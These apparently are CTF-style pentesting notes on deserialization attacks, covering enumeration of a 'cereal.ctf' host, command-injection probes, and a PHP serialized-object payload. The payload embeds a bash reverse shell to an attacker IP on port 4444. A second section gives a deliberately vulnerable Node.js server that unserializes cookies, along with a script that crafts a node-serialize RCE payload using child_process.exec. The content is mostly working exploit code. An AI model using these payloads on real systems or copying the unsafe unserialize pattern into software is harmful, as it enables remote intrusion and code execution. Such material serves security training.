# Deserialization Attack

Discover directories

```bash
gobuster vhost -u http//$ip:44441 -w $directoryListMedium -t 20
```

List subdomains

```bash
gobuster vhost -u http//cereal.ctf:44441 -w $subDomainsTopMillion -t 20
```

Resolving local domains correctly in Firefox `about:config`:

```js
browser.fixup.domainsuffix.whitelist.ctf > boolean -> true
```

Listen to ping

```bash
tcpdump -i ens33 icmp -n
```

The underlying PHP might have

```php
system("ping -c3 " . $_POST['ip_address'])
```

Try to inject the form

```php
146851981 || whoami
127.0.0.1 && whoami
```

It's sanitized, so we move on to [Burp Suite]([[burpsuite]]):

```http
obj=063A8%3%22pingTest%22%3A1%3%7Bs%3A9%3%22ipAddress%2263Bs%314%3%22192.168.111.45%22%3%7D&ip=192.168.111.45
```

`Ctrl+Shift+U` to decode:

```http
obj=0:8:"pingTest":1:(s:9:"ipAddress";s:14:"192.168.111.45;}&ip=192.168.111.45
```

Inspect `php.js` code:

```bash
curl -s -X GET "http://secure.cereal.ctf:44441/php.js" | bat -l js
```

Try a bigger dictionary:

```bash
gobuster vhost -u http//$ip:44441 -w $directoryListBig -t 20
```

Create a serialized object:

```php
<?php

class pingTest {
	public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.111.45/4444 0>&1"
	public $isValid = True;
	public $output = "";
}

echo urlencode(serialize(new pingTest));
```

Run it:

```bash
php serialize.php 2>/dev/null; echo
```

### Javascript Deserialization

From: [Exploiting Node.js deserialization bug for Remote Code Execution](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

Install dependencies:

```bash
npm install express node-serialize cookie-parser
```

Save as `server.js`:

```js
var express = require("express");
var cookieParser = require("cookie-parser");
var escape = require("escape-html");
var serialize = require("node-serialize");
var app = express();
app.use(cookieParser());

app.get("/", function (req, res) {
  if (req.cookies.profile) {
    var str = new Buffer(req.cookies.profile, "base64").toString();
    var obj = serialize.unserialize(str);
    if (obj.username) {
      res.send("Hello " + escape(obj.username));
    }
  } else {
    res.cookie(
      "profile",
      "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=",
      {
        maxAge: 900000,
        httpOnly: true,
      },
    );
  }
  res.send("Hello World");
});
app.listen(3000);
```

Save as `serialize.js`:

```js
var y = {
  rce: function () {
    require("child_process").exec(
      "ls /",
      function (error, stdout, stderr) {
        console.log(stdout);
      },
    );
  },
}();
var serialize = require("node-serialize");
console.log("Serialized: \n" + serialize.serialize(y));
```

Run it:

```
node serialize.js
```
